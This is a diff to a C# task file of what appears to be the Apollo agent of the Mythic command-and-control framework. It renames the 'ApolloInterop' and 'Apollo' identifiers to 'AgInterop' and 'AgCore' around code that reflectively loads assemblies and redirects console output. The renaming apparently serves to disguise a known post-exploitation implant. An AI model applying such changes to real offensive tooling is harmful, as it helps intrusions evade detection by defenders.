@@ -8,9 +8,9 @@
 
 using System;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using AgInterop.Classes;
+using AgInterop.Interfaces;
+using AgInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
 using System.IO;
@@ -19,9 +19,9 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Security.Principal;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Impersonation;
-using ApolloInterop.Utils;
+using AgInterop.Classes.Api;
+using AgInterop.Classes.Impersonation;
+using AgInterop.Utils;
 
 namespace Tasks
 {
@@ -218,7 +218,7 @@ namespace Tasks
                 }
                 else
                 {
-                    resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
+                    resp = CreateTaskResponse("Failed to get AgInterop dependency.", true, "error");
                 }
             }
             catch (Exception ex)
@@ -364,7 +364,7 @@ namespace Tasks
                 Assembly interop2 = null;
                 foreach (var asm2 in AppDomain.CurrentDomain.GetAssemblies())
                 {
-                    if (asm2.FullName.StartsWith("ApolloInterop"))
+                    if (asm2.FullName.StartsWith("AgInterop"))
                     {
                         interop2 = asm2;
                         break;
@@ -374,7 +374,7 @@ namespace Tasks
                 {
                     return;
                 }
-                Type tStringEventArgs = interop2.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
+                Type tStringEventArgs = interop2.GetType("AgInterop.Classes.Events.StringDataEventArgs");
                 FieldInfo fiData = tStringEventArgs.GetField("Data");
                 string data = fiData.GetValue(args) as string;
                 if (!string.IsNullOrEmpty(data))
@@ -385,7 +385,7 @@ namespace Tasks
             Assembly interopAsm = null;
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (asm.FullName.StartsWith("ApolloInterop"))
+                if (asm.FullName.StartsWith("AgInterop"))
                 {
                     interopAsm = asm;
                 }
@@ -402,7 +402,7 @@ namespace Tasks
             var callbackMethod = (EventHandler<EventArgs>)OnWrite;
             
             
-            Type tWriter = interopAsm.GetType("ApolloInterop.Classes.IO.EventableStringWriter");
+            Type tWriter = interopAsm.GetType("AgInterop.Classes.IO.EventableStringWriter");
 
             var writer = Activator.CreateInstance(tWriter);
             EventInfo eiWrite = tWriter.GetEvent("BufferWritten");
@@ -415,7 +415,7 @@ namespace Tasks
             Console.SetError((StringWriter)writer);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
+                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("AgCore"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
